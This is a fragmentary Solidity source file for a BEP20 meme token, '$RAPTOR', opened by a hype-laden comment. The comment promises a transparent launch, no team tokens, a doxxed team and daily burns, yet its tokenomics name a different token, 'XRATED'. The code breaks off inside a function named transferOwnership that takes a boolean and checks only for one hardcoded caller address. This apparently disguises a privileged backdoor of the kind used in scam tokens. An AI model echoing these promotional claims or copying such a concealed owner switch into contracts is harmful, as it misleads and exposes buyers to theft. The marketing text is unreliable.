...
Are your HANDS made up of DIAMONDS or you too DRIVE a TESlA?
...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═════╝░
  ...
  FIRST FULL TRANSPARENT OVERLY HYPED LAUNCH 
  
  Presenting you $RAPTOR  🚀
  
  The Hype IS REAL
  
  For The Real DIAMOND HANDS
  
  Keep an Eye
  
  No Team Tokens 🚀

  1% of Total Tradinf Volume will be bought back and Burned 🔥 to the BLACKHOLE address 🚀 Everday
  
  -SLIPPAGE 10%+ 

  TOKENOMICS
  - 1,000,000,000,000,000 XRATED
  - 10% TAX ON EACH TRANSACTION 
  - 5% TO UNISWAPLIQUIDITY POOL
  - 5% BURNED TO BLACKHOLE 
  - 36% INITIAL BURN
...
/*
 ...
 In all this sell out market 
 
 Let there out be a GEM
 
 Dev Team DOXXXED 🚀
 
 Shit is Real, So are we 
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0x4752379A79E14eFe35eF04dfCDAb10431ACfde3e,
